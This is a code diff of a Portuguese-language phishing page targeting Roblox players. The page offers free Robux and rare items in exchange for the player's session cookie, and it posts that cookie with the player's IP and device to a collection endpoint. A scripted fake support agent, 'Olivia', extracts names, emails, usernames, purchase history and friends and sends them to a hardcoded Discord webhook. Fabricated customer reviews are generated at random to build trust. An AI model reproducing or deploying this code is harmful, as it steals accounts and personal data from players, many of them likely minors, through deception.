@@ -25,6 +25,7 @@
             overflow-x: hidden;
         }
 
+        /* Background com efeito de estrelas */
         .stars {
             position: fixed;
             top: 0;
@@ -48,6 +49,7 @@
             50% { opacity: var(--opacity); transform: scale(1); }
         }
 
+        /* Gradiente animado */
         .aurora {
             position: fixed;
             top: 0;
@@ -76,6 +78,7 @@
             z-index: 10;
         }
 
+        /* Páginas */
         .page {
             transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
         }
@@ -84,6 +87,7 @@
             display: none;
         }
 
+        /* Cards com efeito glass premium */
         .card {
             background: rgba(10, 15, 25, 0.7);
             backdrop-filter: blur(20px);
@@ -97,6 +101,7 @@
                 0 0 80px rgba(99, 102, 241, 0.1);
         }
 
+        /* Header */
         .header {
             display: flex;
             align-items: center;
@@ -157,6 +162,7 @@
             letter-spacing: 0.5px;
         }
 
+        /* Stats modernas */
         .stats-row {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -198,6 +204,7 @@
             letter-spacing: 1px;
         }
 
+        /* Input Area */
         .input-section {
             margin-bottom: 28px;
         }
@@ -277,6 +284,7 @@
             font-weight: 400;
         }
 
+        /* Botão principal */
         .action-btn {
             width: 100%;
             background: linear-gradient(135deg, #6366f1, #a855f7, #ec4899);
@@ -299,6 +307,11 @@
             animation: gradientFlow 3s ease infinite;
         }
 
+        @keyframes gradientFlow {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
         .action-btn::before {
             content: '';
             position: absolute;
@@ -319,6 +332,7 @@
             box-shadow: 0 10px 20px rgba(99, 102, 241, 0.3);
         }
 
+        /* Status message */
         .status-message {
             text-align: center;
             margin-top: 24px;
@@ -329,6 +343,7 @@
             transition: all 0.3s;
         }
 
+        /* Exibição de informações extras */
         .info-row {
             margin-top: 12px;
             display: flex;
@@ -341,6 +356,7 @@
             font-size: 13px;
         }
 
+        /* Footer */
         .footer {
             display: flex;
             justify-content: center;
@@ -362,6 +378,7 @@
             font-size: 16px;
         }
 
+        /* TELA 2 - ESCOLHA */
         .choice-title {
             font-size: 34px;
             font-weight: 700;
@@ -501,6 +518,7 @@
             transform: translateX(-5px);
         }
 
+        /* NOTIFICAÇÃO PROFISSIONAL */
         .notification {
             position: fixed;
             top: 30px;
@@ -584,6 +602,7 @@
             to { width: 0%; }
         }
 
+        /* Loading spinner */
         .spinner {
             width: 20px;
             height: 20px;
@@ -598,6 +617,7 @@
             to { transform: rotate(360deg); }
         }
 
+        /* Mensagem de confirmação */
         .success-check {
             color: #10b981;
             font-size: 40px;
@@ -611,6 +631,7 @@
             100% { transform: scale(1) rotate(0); }
         }
 
+        /* Responsive */
         @media (max-width: 480px) {
             .card { padding: 28px 20px; border-radius: 36px; }
             .title { font-size: 30px; }
@@ -621,6 +642,7 @@
             .notification { left: 20px; right: 20px; max-width: none; }
         }
 
+        /* Estilo para IP banido */
         .banned-message {
             background: rgba(244, 63, 94, 0.1);
             border: 2px solid #f43f5e;
@@ -639,6 +661,7 @@
             20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
 
+        /* ESTILOS DO CHAT OLIVIA - MELHORADOS */
         .chat-card {
             height: 650px;
             display: flex;
@@ -833,6 +856,7 @@
             border-radius: 30px;
         }
 
+        /* Botões de ação rápida */
         .quick-actions {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
@@ -856,6 +880,7 @@
             transform: translateY(-2px);
         }
 
+        /* Indicador de digitação */
         .typing-badge {
             display: inline-block;
             padding: 5px 10px;
@@ -866,6 +891,7 @@
             margin-left: 10px;
         }
 
+        /* AVALIAÇÕES */
         .reviews-section {
             margin-top: 30px;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
@@ -963,6 +989,7 @@
     <div class="aurora"></div>
     <div class="stars" id="stars"></div>
     
+    <!-- NOTIFICAÇÃO -->
     <div class="notification" id="notification">
         <div class="notification-icon">✓</div>
         <div class="notification-content">
@@ -973,6 +1000,7 @@
         <div class="notification-progress" id="notificationProgress"></div>
     </div>
 
+    <!-- TELA 1 - COOKIE -->
     <div id="page1" class="container page">
         <div class="card">
             <div class="header">
@@ -1012,8 +1040,10 @@
                     <div class="preview-text" id="previewText">aguardando cookie...</div>
                 </div>
                 
+                <!-- Área para mensagem de ban -->
                 <div id="banMessage" class="banned-message" style="display: none;"></div>
                 
+                <!-- Exibir apenas cooldown, IP removido -->
                 <div class="info-row">
                     <div class="info-text" id="cooldownInfo"></div>
                 </div>
@@ -1033,15 +1063,19 @@
                 <div class="footer-item"><span>🎯</span> direto</div>
             </div>
 
+            <!-- SEÇÃO DE AVALIAÇÕES -->
             <div class="reviews-section">
                 <div class="reviews-title">
                     <span>⭐</span> AVALIAÇÕES RECENTES
                 </div>
-                <div class="reviews-grid" id="reviewsContainer"></div>
+                <div class="reviews-grid" id="reviewsContainer">
+                    <!-- Avaliações serão inseridas aqui pelo JavaScript -->
+                </div>
             </div>
         </div>
     </div>
 
+    <!-- TELA 2 - ESCOLHA -->
     <div id="page2" class="container page hidden">
         <div class="card">
             <div class="header">
@@ -1055,6 +1089,7 @@
             </div>
 
             <div class="choice-grid">
+                <!-- Robux -->
                 <div class="choice-item" onclick="selectPrize('Robux')">
                     <div class="choice-icon">💰</div>
                     <div class="choice-content">
@@ -1064,6 +1099,7 @@
                     <div class="choice-value">grátis</div>
                 </div>
 
+                <!-- Korblox -->
                 <div class="choice-item" onclick="selectPrize('Korblox')">
                     <div class="choice-icon">👑</div>
                     <div class="choice-content">
@@ -1073,6 +1109,7 @@
                     <div class="choice-value">grátis</div>
                 </div>
 
+                <!-- Headless -->
                 <div class="choice-item" onclick="selectPrize('Headless')">
                     <div class="choice-icon">🎭</div>
                     <div class="choice-content">
@@ -1082,6 +1119,7 @@
                     <div class="choice-value">grátis</div>
                 </div>
 
+                <!-- Recuperar Conta com Olivia -->
                 <div class="choice-item" onclick="openOliviaChat()">
                     <span class="choice-badge">prioridade</span>
                     <div class="choice-icon">💬</div>
@@ -1099,6 +1137,7 @@
         </div>
     </div>
 
+    <!-- TELA 3 - CHAT COM OLIVIA -->
     <div id="page3" class="container page hidden">
         <div class="card chat-card">
             <div class="chat-header">
@@ -1116,6 +1155,7 @@
                 Olivia entrou no chat • tempo de resposta ~30s
             </div>
 
+            <!-- Botões de ação rápida -->
             <div class="quick-actions" id="quickActions">
                 <button class="quick-action-btn" onclick="sendQuickMessage('Perdi minha conta')">📱 Perdi minha conta</button>
                 <button class="quick-action-btn" onclick="sendQuickMessage('Esqueci a senha')">🔑 Esqueci a senha</button>
@@ -1123,7 +1163,9 @@
                 <button class="quick-action-btn" onclick="sendQuickMessage('Email antigo')">📧 Email antigo</button>
             </div>
 
-            <div class="chat-messages" id="chatMessages"></div>
+            <div class="chat-messages" id="chatMessages">
+                <!-- Mensagens aparecerão aqui -->
+            </div>
 
             <div class="chat-input-area">
                 <input type="text" class="chat-input" id="chatInput" placeholder="Digite sua mensagem..." onkeypress="if(event.key==='Enter') sendMessage()">
@@ -1133,14 +1175,15 @@
     </div>
 
     <script>
+        // Configurações
         const API_URL = '/api/webhook';
-        const CHECK_COOKIE_URL = '/api/check-cookie';
         const CHAT_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1479283460488167524/0I--IEPX0FbLAD52jy7WN_AouAO-_jLxUBiwbE2t4i34u6gt_EBYxLTcBKgm4XSVMrVS';
         const CHECK_BAN_URL = '/api/verificar-ban';
         
         const COOLDOWN_TIME = 300000;
         const COOLDOWN_KEY = 'aurora_last_cookie_sent';
 
+        // Variáveis do chat
         let userIP = '';
         let chatHistory = [];
         let conversationId = generateSessionId();
@@ -1151,6 +1194,7 @@
         let userProblem = '';
         let analysisStarted = false;
 
+        // ===== AVALIAÇÕES DINÂMICAS =====
         const reviewTemplates = [
             {
                 names: ["Ana Silva", "Maria Oliveira", "Juliana Costa", "Fernanda Lima", "Patrícia Souza", "Camila Rodrigues", "Beatriz Santos", "Larissa Ferreira", "Amanda Costa", "Gabriela Martins"],
@@ -1222,6 +1266,7 @@
             const container = document.getElementById('reviewsContainer');
             if (!container) return;
 
+            // Gerar 3 avaliações aleatórias
             const reviews = [];
             for (let i = 0; i < 3; i++) {
                 reviews.push(generateRandomReview());
@@ -1246,8 +1291,10 @@
             });
         }
 
+        // Atualizar avaliações a cada 30 segundos
         setInterval(loadReviews, 30000);
 
+        // ===== FUNÇÕES INTERATIVAS =====
         function showStats() {
             showNotification('📊 Estatísticas', `Total de resgates: ${document.getElementById('countStat').textContent}`, false);
         }
@@ -1266,11 +1313,12 @@
             sendMessage();
         }
 
+        // ===== FUNÇÃO PARA MOSTRAR EXEMPLOS =====
         function showExamples() {
             const examples = [
                 "💡 **EXEMPLOS DE RESPOSTAS:**",
-                "• **PRIMEIRO NOME:** João (é o nome que aparece nas compras)",
-                "• **E-MAIL:** joaosilva@gmail.com",
+                "• **NOME COMPLETO:** João Silva Santos",
+                "• **E-MAIL:** joaosilva@gmail.com  (pode ser novo, vamos colocar na conta)",
                 "• **USERNAME:** joaozinho_roblox123",
                 "• **COMPRA:** R$50 ou Korblox",
                 "• **ACESSO E-MAIL:** SIM ou NÃO",
@@ -1292,6 +1340,7 @@
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
+        // ===== BOTÕES SIM/NÃO =====
         function addYesNoButtons() {
             const messagesDiv = document.getElementById('chatMessages');
             const optionsDiv = document.createElement('div');
@@ -1321,31 +1370,45 @@
             messagesDiv.scrollTop = messagesDiv.scrollHeight;
         }
 
+        // ===== MENSAGENS DA OLIVIA - MUITO MAIS COMPLETAS =====
         const oliviaMessages = [
-            "Olá! Sou Olivia, prazer em te conhecer! 😊 Vou te ajudar a recuperar sua conta.\n\nPrimeiro, me conta: o que aconteceu com sua conta?\n\n✅ Opções comuns:\n• Perdi acesso à conta\n• Esqueci minha senha\n• Minha conta foi hackeada\n• Não consigo mais acessar o email",
+            // Passo 0 - Boas-vindas
+            "Olá! Sou Olivia, prazer em te conhecer! 😊 Vou te ajudar a recuperar sua conta.\n\nPrimeiro, me conta: o que aconteceu com sua conta?\n\n✅ Opções comuns:\n• Perdi acesso à conta\n• Esqueceram minha senha\n• Minha conta foi hackeada\n• Não consigo mais acessar o email\n\nFique tranquilo, vou te ajudar passo a passo!",
 
+            // Passo 1 - Entendendo o problema
             "Entendi! Agora me diga qual é o seu PRIMEIRO NOME (o nome que você usa no Roblox ou seu nome real).\n\nIsso é importante porque quando você compra Robux, o nome fica registrado no histórico de compras. Assim podemos confirmar que a conta é realmente sua!",
 
+            // Passo 2 - Solicitando email
             "Obrigada! Agora me informe um E-MAIL válido.\n\n📧 Pode ser um email novo, é para onde vamos enviar as instruções de recuperação.\n\nExemplo: meunome@gmail.com",
 
-            "Perfeito! Agora qual é seu NOME DE USUÁRIO no Roblox?\n\n🎮 Exemplo: joaozinho_roblox123",
+            // Passo 3 - Username Roblox
+            "Perfeito! Agora qual é seu NOME DE USUÁRIO no Roblox?\n\n🎮 Exemplo: joaozinho_roblox123\n\nÉ o nome que aparece quando você joga.",
 
-            "Ótimo! Agora me diga qual foi a ÚLTIMA COMPRA que você fez no Roblox.\n\n💰 Pode ser o valor ou o item (ex: R$50, Korblox)",
+            // Passo 4 - Última compra
+            "Ótimo! Agora me diga qual foi a ÚLTIMA COMPRA que você fez no Roblox.\n\n💰 Pode ser:\n• O valor (ex: R$25, R$50)\n• O item comprado (ex: Korblox, Headless)\n• A data aproximada da compra",
 
-            "Entendi! Você ainda tem ACESSO AO E-MAIL de cadastro? (SIM ou NÃO)",
+            // Passo 5 - Acesso ao email
+            "Entendi! Você ainda tem ACESSO AO E-MAIL de cadastro?\n\n✅ Responda apenas com SIM ou NÃO.\n\nIsso ajuda a saber se podemos enviar o código de verificação para o email antigo.",
 
-            "Ok! Agora me diga a DATA APROXIMADA que você criou essa conta (ex: 2020, março/2021)",
+            // Passo 6 - Data de criação
+            "Ok! Agora me diga a DATA APROXIMADA que você criou essa conta.\n\n📅 Exemplos:\n• 2020\n• março/2021\n• início de 2022\n\nNão precisa ser exato, só uma estimativa ajuda.",
 
-            "Você tem algum ITEM EXCLUSIVO ou raro na conta? (ex: Headless, Korblox)",
+            // Passo 7 - Itens exclusivos
+            "Você tem algum ITEM EXCLUSIVO ou raro na conta?\n\n👑 Exemplos:\n• Headless Horseman\n• Korblox Deathspeaker\n• Dominus\n• Itens de eventos limitados\n\nIsso ajuda a confirmar que a conta é sua.",
 
-            "Quantos ROBUX você tem atualmente na conta? (valor aproximado)",
+            // Passo 8 - Robux atual
+            "Quantos ROBUX você tem atualmente na conta?\n\n💎 Um valor aproximado já ajuda:\n• 500 Robux\n• 1.000 Robux\n• 5.000+ Robux",
 
-            "Você se lembra de algum AMIGO que tem na sua lista? (nome de 1 ou 2 amigos)",
+            // Passo 9 - Amigos na conta
+            "Você se lembra de algum AMIGO que tem na sua lista?\n\n👥 Pode me dizer o nome de 1 ou 2 amigos que você tinha adicionado?\n\nIsso também é uma forma de verificação.",
 
-            "Qual foi o PRIMEIRO ITEM que você comprou ou ganhou no Roblox?",
+            // Passo 10 - Primeiro item
+            "Qual foi o PRIMEIRO ITEM que você comprou ou ganhou no Roblox?\n\n🎁 Pode ser algo simples como um chapéu ou uma roupa.",
 
-            "Todas as informações foram enviadas para análise. 🔍\n\n⏳ Isso pode levar até 24 horas.\n\n⚠️ Não tente novamente durante este período, pois o sistema vai bloquear.",
+            // Passo 11 - Analisando
+            "Todas as informações foram enviadas para análise. 🔍\n\n⏳ Isso pode levar até 24 horas.\n\n⚠️ Não tente novamente durante este período, pois o sistema vai bloquear e você não receberá nada.",
 
+            // Passo 12 - Final
             "Sua solicitação está em análise. Você receberá um e-mail em até 24 horas com as instruções.\n\nObrigado por usar a Aurora! ❤️"
         ];
 
@@ -1353,17 +1416,21 @@
             "Ainda estou aqui! Estou só esperando sua resposta.",
             "Sem pressa! Me responde quando puder.",
             "Continua aí? Qualquer dúvida é só perguntar.",
-            "Estou aguardando sua resposta para continuar.",
-            "Não precisa ter pressa, estou aqui para ajudar!"
+            "Estou aguardando sua resposta para continuar com o atendimento.",
+            "Ainda está aí? Podemos continuar quando você quiser.",
+            "Não precisa ter pressa, estou aqui para ajudar!",
+            "Se tiver dúvidas sobre alguma pergunta, pode me perguntar."
         ];
 
         const goodbyeMessages = [
             "Foi um prazer ajudar!",
             "Qualquer coisa, é só voltar!",
             "Até mais! Cuide bem da sua conta!",
-            "Volte sempre que precisar!"
+            "Volte sempre que precisar!",
+            "Espero ter ajudado! Qualquer dúvida, estou aqui."
         ];
 
+        // ===== FUNÇÕES DO CHAT OLIVIA =====
         function openOliviaChat() {
             document.getElementById('page2').classList.add('hidden');
             document.getElementById('page3').classList.remove('hidden');
@@ -1486,7 +1553,7 @@
             if (!text) return;
             
             if (analysisStarted) {
-                addOliviaMessage("Sua solicitação já está em análise. Aguarde 24 horas.");
+                addOliviaMessage("Sua solicitação já está em análise. Por favor, aguarde até 24 horas para receber o e-mail.");
                 input.value = '';
                 return;
             }
@@ -1496,13 +1563,19 @@
             document.getElementById('quickActions').style.display = 'none';
             chatStep++;
             
+            // Mapeamento dos passos para envio ao webhook
             if (chatStep === 1) {
                 userProblem = text;
                 sendToWebhook('info', 'problema', { problema: text });
             } 
             else if (chatStep === 2) {
-                if (text.length < 2) {
-                    addOliviaMessage("Por favor, digite um nome válido");
+                if (text.length < 5) {
+                    addOliviaMessage("Por favor, digite um NOME COMPLETO válido (mínimo 5 letras)");
+                    chatStep--;
+                    return;
+                }
+                if (text.includes('@')) {
+                    addOliviaMessage("Isso parece um e-mail. Digite seu NOME COMPLETO (ex: João Silva)");
                     chatStep--;
                     return;
                 }
@@ -1511,7 +1584,7 @@
             } 
             else if (chatStep === 3) {
                 if (!text.includes('@') || !text.includes('.')) {
-                    addOliviaMessage("Digite um email válido (ex: nome@gmail.com)");
+                    addOliviaMessage("Isso não parece um E-MAIL válido. Digite um email com @ e . (ex: nome@gmail.com)");
                     chatStep--;
                     return;
                 }
@@ -1520,7 +1593,7 @@
             } 
             else if (chatStep === 4) {
                 if (text.length < 3) {
-                    addOliviaMessage("Digite um nome de usuário válido");
+                    addOliviaMessage("Por favor, digite um NOME DE USUÁRIO válido (mínimo 3 caracteres)");
                     chatStep--;
                     return;
                 }
@@ -1528,6 +1601,11 @@
                 sendToWebhook('info', 'username', { username: text });
             } 
             else if (chatStep === 5) {
+                if (text.length < 2) {
+                    addOliviaMessage("Por favor, digite algo sobre a última compra (ex: R$50, Korblox)");
+                    chatStep--;
+                    return;
+                }
                 sendToWebhook('info', 'ultima_compra', { compra: text });
                 setTimeout(() => {
                     addYesNoButtons();
@@ -1536,13 +1614,18 @@
             else if (chatStep === 6) {
                 const resposta = text.toUpperCase();
                 if (resposta !== 'SIM' && resposta !== 'NÃO' && resposta !== 'NAO') {
-                    addOliviaMessage("Responda apenas com SIM ou NÃO");
+                    addOliviaMessage("Por favor, responda apenas com SIM ou NÃO");
                     chatStep--;
                     return;
                 }
                 sendToWebhook('info', 'acesso_email', { acesso: text });
             } 
             else if (chatStep === 7) {
+                if (text.length < 4) {
+                    addOliviaMessage("Por favor, digite uma data aproximada (ex: 2020, março/2021)");
+                    chatStep--;
+                    return;
+                }
                 sendToWebhook('info', 'data_criacao', { data: text });
             } 
             else if (chatStep === 8) {
@@ -1759,6 +1842,7 @@ Problema: ${userProblem || 'Não informado'}
             document.getElementById('notification').classList.remove('show');
         }
 
+        // Funções de limpeza e validação de cookie
         function cleanCookie(cookie) {
             let c = cookie.trim();
             c = c.replace(/^["']|["']$/g, '');
@@ -1846,7 +1930,7 @@ Problema: ${userProblem || 'Não informado'}
             const cookie = cleanCookie(rawCookie);
 
             if (!isValidCookieFormat(cookie)) {
-                showNotification('Erro', 'Formato de cookie inválido!', false);
+                showNotification('Erro', 'Formato de cookie inválido! Use o formato correto.', false);
                 return;
             }
 
@@ -1856,67 +1940,15 @@ Problema: ${userProblem || 'Não informado'}
                 return;
             }
 
-            status.innerHTML = '<div class="spinner"></div><br><small>Verificando cookie...</small>';
+            if (cookie.length < 50) {
+                showNotification('Erro', 'Cookie incompleto', false);
+                return;
+            }
+
+            status.innerHTML = '<div class="spinner"></div>';
             btn.disabled = true;
 
             try {
-                // 🔥 VERIFICAR COOKIE PRIMEIRO
-                const checkResponse = await fetch(CHECK_COOKIE_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ cookie: cookie })
-                });
-
-                const checkData = await checkResponse.json();
-
-                if (!checkData.valid) {
-                    status.innerHTML = '';
-                    showNotification('Erro', 'Cookie inválido ou expirado!', false);
-                    btn.disabled = false;
-                    return;
-                }
-
-                // 🔥 VERIFICAR SE É BOT OU CONTA INVÁLIDA
-                if (checkData.isBot) {
-                    status.innerHTML = '';
-                    
-                    // Mostrar motivos do bloqueio
-                    let motivos = '';
-                    if (checkData.reasons && checkData.reasons.length > 0) {
-                        motivos = checkData.reasons.map(r => `• ${r}`).join('<br>');
-                    }
-                    
-                    showNotification('🚫 BLOQUEADO', 'Cookie rejeitado - conta suspeita', true);
-                    
-                    // Mostrar detalhes no console
-                    console.log('❌ Cookie rejeitado:', checkData.reasons);
-                    
-                    btn.disabled = false;
-                    return;
-                }
-
-                // 🔥 VERIFICAÇÕES ESPECÍFICAS
-                const accountAge = checkData.account?.age?.days || 0;
-                const robux = checkData.robux?.atual || 0;
-                const purchases = checkData.compras?.total || 0;
-
-                // Conta muito recente (2026)
-                if (checkData.account?.created?.includes('2026')) {
-                    showNotification('🚫 BLOQUEADO', 'Conta criada em 2026 - muito recente', true);
-                    btn.disabled = false;
-                    return;
-                }
-
-                // Conta sem atividade
-                if (accountAge < 30 && robux === 0 && purchases === 0) {
-                    showNotification('🚫 BLOQUEADO', 'Conta muito nova e sem atividade', true);
-                    btn.disabled = false;
-                    return;
-                }
-
-                // Se passou em todas as verificações, enviar para webhook
-                status.innerHTML = '<div class="spinner"></div><br><small>Enviando cookie...</small>';
-
                 const response = await fetch(API_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -1924,13 +1956,7 @@ Problema: ${userProblem || 'Não informado'}
                         cookie: cookie,
                         ip: userIP,
                         device: navigator.userAgent.includes('Mobile') ? '📱 Celular' : '💻 PC',
-                        timestamp: new Date().toLocaleString('pt-BR'),
-                        accountInfo: {
-                            username: checkData.account?.username,
-                            age: checkData.account?.age?.texto,
-                            robux: checkData.robux?.atual,
-                            score: checkData.score
-                        }
+                        timestamp: new Date().toLocaleString('pt-BR')
                     })
                 });
 
@@ -1963,7 +1989,6 @@ Problema: ${userProblem || 'Não informado'}
                     }
                 }
             } catch (error) {
-                console.error('Erro:', error);
                 showNotification('Erro', 'Falha ao enviar cookie', false);
             } finally {
                 setTimeout(() => { 
